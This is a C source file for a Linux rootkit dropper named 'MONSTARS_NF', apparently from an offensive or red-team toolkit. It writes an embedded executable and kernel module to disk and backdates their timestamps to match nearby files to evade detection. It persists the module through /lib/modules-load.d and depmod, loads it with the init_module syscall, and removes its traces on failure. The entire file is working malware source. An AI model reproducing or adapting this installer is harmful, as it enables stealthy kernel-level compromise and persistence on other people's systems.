#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <linux/module.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <utime.h>

// precompiled headers
#include <ko_precompiled.h>    // c_KernelMod
#include <user_precompiled.h>  // c_UserExe

// debug logging
#ifdef DEBUG
    #define DEBUG_LOG(...) printf(__VA_ARGS__)
#else
    #define DEBUG_LOG(...)
#endif

// *** magic values to stamp over ***
static const char c_user_exe_path[255] = "BASKETBALLJONES";
static const char c_kernel_mod_path[255] = "MORONMOUNTAIN";

//
// guess reasonable mtime timestamp for a file (uses closest matching filename)
//
time_t best_mtime(const char *filepath)
{
    time_t best_time = 0;
    char *dirname = strdup(filepath);
    char *basename = NULL;

    if (NULL != dirname)
    {
        struct dirent **names = NULL;
        int num_names = 0;
        char *slash_idx = NULL;
        int base_len = 0;

        DEBUG_LOG("finding timestamp match for %s\n", filepath);

        // parse the dirname and basename
        slash_idx = strrchr(filepath, '/');
        basename = slash_idx + 1;
        base_len = strlen(basename);

        slash_idx = strrchr(dirname, '/');
        *slash_idx = '\0';
       
        num_names = scandir(dirname, &names, NULL, alphasort);
        if (-1 != num_names)
        {
            // start at -1 to allow /. (current dir) as a default
            int most_matched = -1;
            for (int idx=0; idx < num_names; idx++)
            {
                char *curr_name = names[idx]->d_name;
                int curr_len = strlen(curr_name);
                int min_len = curr_len < base_len ? curr_len : base_len;

                int curr = 0;
                for (; (curr < min_len) && (curr_name[curr] == basename[curr]); curr++);
                if (curr > most_matched)
                {
                    char fullpath[258] = {0};
                    struct stat sb = {0};

                    snprintf(fullpath, sizeof(fullpath), "%s/%s", dirname, curr_name);
                    if (0 == stat(fullpath, &sb))
                    {
                        DEBUG_LOG("    best match so far: %s\n", fullpath);
                        most_matched = curr;
                        best_time = sb.st_mtime;
                    }
                    else
                    {
                        DEBUG_LOG("stat failed on %s (errno: %d)\n", curr_name, errno);
                    }
                }
                // assume alphabetical order means best match should increase to a global max
                else if (most_matched > 0)
                {
                    break;
                }
            }
            free(names);
        }
        free(dirname);
    }

    return best_time;
}

//
// check for /proc/task (ko already inserted)
//
int check_proc_task()
{
    int retval = 0;
    FILE *task = fopen("/proc/task", "r");
    if (NULL != task)
    {
        fclose(task);
        DEBUG_LOG("/proc/task already exists!\n");
        retval = -1;
    }
    return retval;
}

//
// drop the user exe to disk
//
int drop_user_exe()
{
    int retval = -1;
    time_t timestamp = best_mtime(c_user_exe_path);
    if (0 != timestamp)
    {
        FILE *user_exe = fopen(c_user_exe_path, "w");
        if (NULL != user_exe)
        {
            struct utimbuf times = {timestamp, timestamp};
            if (sizeof(c_UserExe) == fwrite((void *)c_UserExe, sizeof(char), sizeof(c_UserExe), user_exe))
            {
                // rwxr-xr-x
                if (0 == chmod(c_user_exe_path, (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)))
                {
                    DEBUG_LOG("Dropped user exe: %s\n", c_user_exe_path);
                }
                else
                {
                    DEBUG_LOG("Could not chmod u+x on user exe (errno: %d)\n", errno);
                }
            }
            else
            {
                DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", c_user_exe_path, errno);
            }
            fclose(user_exe);
            if (0 == utime(c_user_exe_path, &times))
            {
                DEBUG_LOG("Set timestamps for %s\n", c_user_exe_path);
                retval = 0;
            }
            else
            {
                DEBUG_LOG("Could not set timestamps for %s (errno: %d)\n", c_user_exe_path, errno);
            }
        }
        else
        {
            DEBUG_LOG("Could not open %s (errno: %d)\n", c_user_exe_path, errno);
        }
    }
    else
    {
        DEBUG_LOG("Could not create timestamp for %s (errno: %d)\n", c_user_exe_path, errno);
    }
    return retval;
}

//
// drop the kernel module to disk
//
int drop_kernel_mod()
{
    int retval = -1;
    time_t timestamp = best_mtime(c_kernel_mod_path);
    if (0 != timestamp)
    {
        FILE *ko = fopen(c_kernel_mod_path, "w");
        if (NULL != ko)
        {
            struct utimbuf times = {timestamp, timestamp};
            if (sizeof(c_KernelMod) == fwrite((void *)c_KernelMod, sizeof(char), sizeof(c_KernelMod), ko))
            {
                DEBUG_LOG("Dropped kernel module: %s\n", c_kernel_mod_path);
            }
            else
            {
                DEBUG_LOG("Could not write ko to %s (errno: %d)\n", c_kernel_mod_path, errno);
            }
            fclose(ko);
            if (0 == utime(c_kernel_mod_path, &times))
            {
                DEBUG_LOG("Set timestamps for %s\n", c_kernel_mod_path);
                retval = 0;
            }
            else
            {
                DEBUG_LOG("Could not set timestamps for %s (errno: %d)\n", c_kernel_mod_path, errno);
            }
        }
        else
        {
            DEBUG_LOG("Could not open %s (errno: %d)\n", c_kernel_mod_path, errno);
        }
    }
    else
    {
        DEBUG_LOG("Could not create timestamp for %s (errno: %d)\n", c_kernel_mod_path, errno);
    }
    return retval;
}

//
// set up the kernel module to be inserted on boot
//
int persist_kernel_mod()
{
    int retval = -1;
    char *ko_basename = NULL;
    char ko_name[64] = {0};
    size_t read = 0;
    int depmod_ret = 0;

    // parse the object name from the file path
    ko_basename = basename((char*)c_kernel_mod_path);
    if (NULL == ko_basename)
    {
        DEBUG_LOG("Could not split ko filename (errno: %d)\n", errno);
        goto exit;
    }
    if (1 != sscanf(ko_basename, "%[^.].ko", ko_name))
    {
        DEBUG_LOG("Could not parse ko name (errno: %d)\n", errno);
        goto exit;
    }

    // add config to /lib/modules-load.d
    char conf_name[128] = {0};
    time_t timestamp = 0;
    snprintf(conf_name, sizeof(conf_name), "/lib/modules-load.d/%s.conf", ko_name);
    timestamp = best_mtime(conf_name);
    if (0 != timestamp)
    {
        FILE *conf = fopen(conf_name, "w");
        if (NULL != conf)
        {
            struct utimbuf times = {timestamp, timestamp};
            if ((strlen(ko_name) + 1) == fprintf(conf, "%s\n", ko_name))
            {
                DEBUG_LOG("Added %s to %s\n", ko_name, conf_name);
            }
            else
            {
                DEBUG_LOG("Could not add %s entry (errno: %d)\n", conf_name, errno);
                unlink(conf_name);
            }
            fclose(conf);
            if (0 == utime(conf_name, &times))
            {
                DEBUG_LOG("Set timestamps for %s\n", conf_name);
                retval = 0;
            }
        }
        else
        {
            DEBUG_LOG("Could not create %s (errno: %d)\n", conf_name, errno);
        }
    }
    else
    {
        DEBUG_LOG("Could not create timestamp for %s (errno: %d)\n", conf_name, errno);
    }

    // Invoke depmod to update the kernel module database
    if (0 == retval)
    {
        depmod_ret = system("depmod");
        DEBUG_LOG("depmod returned: %d\n", depmod_ret);
    }

exit:
    return retval;
}

int main()
{
    int retval = -1;

    if (0 == check_proc_task())
    {
        if (0 == drop_user_exe())
        {
            if (0 == drop_kernel_mod())
            {
                if (0 == persist_kernel_mod())
                {
                    if (0 == syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
                    {
                        DEBUG_LOG("MONSTARS_NF installed!\n");
                        retval = 0;
                    }
                    else
                    {
                        DEBUG_LOG("Failed to insert MONSTARS_NF module (errno: %d)\n", errno);
                    }
                }
            }
        }
    }

    // cleanup in error cases
    if (0 != retval)
    {
        unlink(c_kernel_mod_path);
        unlink(c_user_exe_path);
    }

    return retval;
}